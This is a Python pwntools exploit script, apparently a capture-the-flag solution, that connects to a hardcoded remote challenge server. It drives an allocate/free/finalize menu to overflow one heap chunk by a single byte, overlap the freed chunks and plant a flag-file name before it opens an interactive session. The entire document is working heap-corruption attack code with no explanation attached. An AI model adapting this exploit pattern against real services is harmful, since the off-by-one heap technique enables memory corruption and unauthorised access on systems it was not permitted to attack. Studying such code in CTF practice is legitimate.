from pwn import *

# Helper functions for menu operations
def create_chunk(size, content):
    """Create a memory chunk of the specified size with given content."""
    connection.sendlineafter(b"Choice:", b"1")
    connection.sendlineafter(b"secret:", str(size).encode())
    connection.sendlineafter(b"secret:", content)


def delete_chunk(index):
    """Delete the memory chunk at the given index."""
    connection.sendlineafter(b"Choice:", b"2")
    connection.sendlineafter(b"(ID#):", str(index).encode())


def finalize_chunks():
    """Finalize chunks for the exploit to proceed."""
    connection.sendlineafter(b"Choice:", b"3")


# Remote connection setup
connection = remote("35.184.182.18", 32005)

# Exploit logic
create_chunk(0x88, b"aaa")                # Create the first chunk
create_chunk(0x88, b"bbb")                # Create the second chunk
finalize_chunks()                         # Trigger finalize step
delete_chunk(0)                           # Free the first chunk

# Overwrite the freed chunk with controlled data
create_chunk(0x88, b"c" * 0x88 + b"\xf0")
delete_chunk(1)                           # Free the second chunk

# Create a larger chunk to overwrite and prepare the payload
create_chunk(0xe8, b"x" * 0x90 + b"Exploit400_flag.txt")

# Trigger the exploit and get the flag
connection.sendlineafter(b"Choice:", b"4")
connection.interactive()
